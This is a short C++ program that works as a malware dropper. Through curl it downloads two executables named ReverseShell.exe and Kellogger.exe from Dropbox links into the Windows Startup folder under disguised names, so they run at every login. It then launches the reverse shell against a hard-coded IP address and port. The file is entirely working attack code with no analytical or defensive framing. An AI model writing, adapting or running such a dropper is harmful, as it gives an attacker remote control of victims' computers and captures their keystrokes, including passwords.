#include <iostream>

int main()
{
    system("curl https://www.dropbox.com/s/bwuphhdwe9p9j1k/ReverseShell.exe?dl=1 --output \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\seal.exe\"");
    system("curl https://www.dropbox.com/s/filil5duichcn8u/Kellogger.exe?dl=1 --output \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chonkyseal.exe\"");
    system("cd \"%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"|seal.exe 10.83.32.110 27015");
}

